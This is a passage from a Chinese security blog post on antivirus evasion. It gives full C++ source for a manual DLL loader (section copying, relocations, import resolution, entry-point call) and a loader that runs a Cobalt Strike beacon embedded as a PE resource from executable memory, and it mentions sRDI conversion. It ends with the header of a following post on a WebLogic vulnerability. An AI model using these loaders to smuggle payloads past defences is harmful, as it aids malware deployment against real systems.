class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry &#x3D; BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; get this module&#39;s image base address</span><br><span class="line">	PVOID imageBase &#x3D; GetModuleHandleA(NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; load DLL into memory</span><br><span class="line">	HANDLE dll &#x3D; CreateFileA(&quot;\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize &#x3D; GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes &#x3D; HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize &#x3D; 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get pointers to in-memory DLL headers</span><br><span class="line">	PIMAGE_DOS_HEADER dosHeaders &#x3D; (PIMAGE_DOS_HEADER)dllBytes;</span><br><span class="line">	PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">	SIZE_T dllImageSize &#x3D; ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; allocate new memory space for the DLL. Try to allocate memory in the image&#39;s preferred base address, but don&#39;t stress if the memory is allocated elsewhere</span><br><span class="line">	&#x2F;&#x2F;LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get delta between this module&#39;s image base and the DLL that was read into memory</span><br><span class="line">	DWORD_PTR deltaImageBase &#x3D; (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy over DLL image headers to the newly allocated space for the DLL</span><br><span class="line">	std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy over DLL image sections to the newly allocated space for the DLL</span><br><span class="line">	PIMAGE_SECTION_HEADER section &#x3D; IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		LPVOID sectionDestination &#x3D; (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">		LPVOID sectionBytes &#x3D; (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">		std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">		section++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; perform image base relocations</span><br><span class="line">	IMAGE_DATA_DIRECTORY relocations &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable &#x3D; relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock &#x3D; (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount &#x3D; (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) &#x2F; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i &#x3D; 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type &#x3D;&#x3D; 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA &#x3D; relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch &#x3D; 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch +&#x3D; deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; resolve import address table</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR importDescriptor &#x3D; NULL;</span><br><span class="line">	IMAGE_DATA_DIRECTORY importsDirectory &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">	importDescriptor &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">	LPCSTR libraryName &#x3D; &quot;&quot;;</span><br><span class="line">	HMODULE library &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	while (importDescriptor-&gt;Name !&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		libraryName &#x3D; (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">		library &#x3D; LoadLibraryA(libraryName);</span><br><span class="line"></span><br><span class="line">		if (library)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_THUNK_DATA thunk &#x3D; NULL;</span><br><span class="line">			thunk &#x3D; (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">			while (thunk-&gt;u1.AddressOfData !&#x3D; NULL)</span><br><span class="line">			&#123;</span><br><span class="line">				if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">				&#123;</span><br><span class="line">					LPCSTR functionOrdinal &#x3D; (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">					thunk-&gt;u1.Function &#x3D; (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME functionName &#x3D; (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">					DWORD_PTR functionAddress &#x3D; (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">					thunk-&gt;u1.Function &#x3D; functionAddress;</span><br><span class="line">				&#125;</span><br><span class="line">				++thunk;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		importDescriptor++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; execute the loaded DLL</span><br><span class="line">	DLLEntry DllEntry &#x3D; (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br><span class="line"></span><br><span class="line">	CloseHandle(dll);</span><br><span class="line">	HeapFree(GetProcessHeap(), 0, dllBytes);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们先看一下执行的结果把，如下所示：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110173735378.png" alt="image-20201110173735378"></p>
<p>​    也就是通过上面的代码，可以加载并运行我们的dll，了解了这个我们再来看一下代码实现的逻辑。</p>
<p>​    首先，通过下面的代码声明两个结构体，并且声明了一个函数指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry &#x3D; BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br></pre></td></tr></table></figure>

<p>​    下面使用 GetModuleHandleA(NULL)来返回进程的地址空间中的可执行文件的基地址，使用GetFileSize打开我们要加载的DLL文件，再调用在堆上分配大小为dllsize的内存空间，通过ReadFile将DLL文件中的内容写入到刚分配的堆地址空间中。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PVOID imageBase &#x3D; GetModuleHandleA(NULL);</span><br><span class="line">	HANDLE dll &#x3D; CreateFileA(&quot;C:\\Users\\admin\\source\\repos\\testDLl\\Debug\\testDLl.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize &#x3D; GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes &#x3D; HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize &#x3D; 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br></pre></td></tr></table></figure>

<p>​    我们调试一下这个程序，可以看到当运行完ReadFile后，确实将DLL的内容复制到了dllBytes指向的内存中。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110175404600.png" alt="image-20201110175404600"></p>
<p>​    好了，我们再看一下后面的代码，首先获取dosheaders，再通过dllbytes首地址+dosheaders-&gt;e_lfanew的值相加，得到pe头的地址。再通过取出OptionalHeader.SizeOfImage属性获取映像加载到内存后的大小    。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111095440475.png" alt="image-20201111095440475"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_DOS_HEADER dosHeaders &#x3D; (PIMAGE_DOS_HEADER)dllBytes; </span><br><span class="line">PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">SIZE_T dllImageSize &#x3D; ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br></pre></td></tr></table></figure>

<p>​        再使用VirtualAlloc分配一块基址为ntHeaders-&gt;OptionalHeader.ImageBase，大小为dllImageSize的内存，并且更改内存为可读写执行权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure>

<p>​    获取我们预期分配地址和实际分配地址的差值，并且将文件头部复制到分配的内存中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD_PTR deltaImageBase &#x3D; (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111102159539.png" alt="image-20201111102159539">    </p>
<p>​    下面的代码将区块表的内容拷贝到分配的内存中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_SECTION_HEADER section &#x3D; IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">for (size_t i &#x3D; 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">	LPVOID sectionDestination &#x3D; (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">	LPVOID sectionBytes &#x3D; (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">	std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">	section++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    下面的代码用来修改pe的重定位表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY relocations &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable &#x3D; relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock &#x3D; (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount &#x3D; (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) &#x2F; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i &#x3D; 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type &#x3D;&#x3D; 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA &#x3D; relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch &#x3D; 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch +&#x3D; deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>​    被注入的DLL可能还依赖于其他的DLL，因此我们还需要装载这些被依赖的DLL，并修改本DLL的引入表，使这些被引入的函数能正常运行。解析导入表，根据IMAGE_IMPORT_DESCRIPTOR中的NAME成员找到DLL的名称，根据名称装载被依赖的DLL,IMAGE_IMPORT_DESCRIPTOR的FirstThunk指向了DLL引入了哪些函数。通过GetProcAddress可以找到函数的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDescriptor &#x3D; NULL;</span><br><span class="line">IMAGE_DATA_DIRECTORY importsDirectory &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">importDescriptor &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">LPCSTR libraryName &#x3D; &quot;&quot;;</span><br><span class="line">HMODULE library &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">while (importDescriptor-&gt;Name !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">	libraryName &#x3D; (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">	library &#x3D; LoadLibraryA(libraryName); </span><br><span class="line"></span><br><span class="line">	if (library)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_THUNK_DATA thunk &#x3D; NULL;</span><br><span class="line">		thunk &#x3D; (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">		while (thunk-&gt;u1.AddressOfData !&#x3D; NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">			&#123;</span><br><span class="line">				LPCSTR functionOrdinal &#x3D; (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">				thunk-&gt;u1.Function &#x3D; (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME functionName &#x3D; (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">				DWORD_PTR functionAddress &#x3D; (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">				thunk-&gt;u1.Function &#x3D; functionAddress;</span><br><span class="line">			&#125;</span><br><span class="line">			++thunk;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	importDescriptor++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过AddressOfEntryPoint找到DLL文件的入口点，最终会执行dllmain函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DLLEntry DllEntry &#x3D; (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br></pre></td></tr></table></figure>

<p>​    由于个人windows基础能力有限，关于上面代码的分析参考<a href="https://www.freebuf.com/articles/others-articles/245305.html" target="_blank" rel="noopener">恶意代码分析之反射型DLL注入</a>、<a href="https://github.com/potats0/PeLoader" target="_blank" rel="noopener">peloader</a>，最后我们再理一下这个过程</p>
<ul>
<li>在堆上分配一块内存，将DLL文件加载到内存</li>
<li>将DLL文件头部放到分配的内存上</li>
<li>将区块表的内容复制到内存</li>
<li>修改重定向表和解析导入表</li>
<li>调用DLL</li>
</ul>
<h2 id="从PE-resource加载shellcode"><a href="#从PE-resource加载shellcode" class="headerlink" title="从PE resource加载shellcode"></a>从PE resource加载shellcode</h2><p>​    使用这种方式可以将shellcode放到资源文件中进行加载，具体操作过程如下：</p>
<p>首先生成一个stagerless的bin文件，我这里使用cobaltstrike来进行生成，生成以后将bin添加到资源文件中</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111171204066.png" alt="image-20201111171204066"></p>
<p>​    选择导入资源，选择我们生成的bin文件，资源类型由我们自己命名</p>
<img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175537339.png" alt="image-20201111175537339" style="zoom:67%;">



<p>​    在头文件中可以看到我们加载的资源文件的标识符。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111175617208.png" alt="image-20201111175617208"></p>
<p>​    最后使用如下代码加载资源并进行解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &quot;resource.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode</span><br><span class="line">	&#x2F;&#x2F; METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin</span><br><span class="line">	HRSRC shellcodeResource &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_BEACON1), L&quot;METERPRETER_BIN&quot;);</span><br><span class="line">	DWORD shellcodeSize &#x3D; SizeofResource(NULL, shellcodeResource);</span><br><span class="line">	HGLOBAL shellcodeResouceData &#x3D; LoadResource(NULL, shellcodeResource);</span><br><span class="line"></span><br><span class="line">	void* exec &#x3D; VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcodeResouceData, shellcodeSize);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">	return  0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码首先通过FindResource找到我们想要加载的资源，通过LoadResource加载资源的内容，再通过VirtualAlloc分配一块内存，将资源复制到内存，通过函数指针的方式调用执行shellcode。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111180732544.png" alt="image-20201111180732544"></p>
<p>​    也可以将DLL加载到资源中执行，这个操作需要依赖<a href="https://github.com/monoxgas/sRDI" target="_blank" rel="noopener">sRDI</a></p>
<p>​    首先生成一个dll文件，利用ConvertToShellcode.py将DLL文件转换为bin文件</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111182017884.png" alt="image-20201111182017884"></p>
<p>​    在vs中将生成的beacon.bin文件放到资源中加载，我测试执行并没有成功，但是生成一个messagebox弹窗的dll转换为bin执行是可以的，原因未知。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111193353829.png" alt="image-20201111193353829"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">weblogic漏洞分析系列之CVE-2017-10271漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-30 23:15:58" itemprop="dateCreated datePublished" datetime="2020-10-30T23:15:58+08:00">2020-10-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
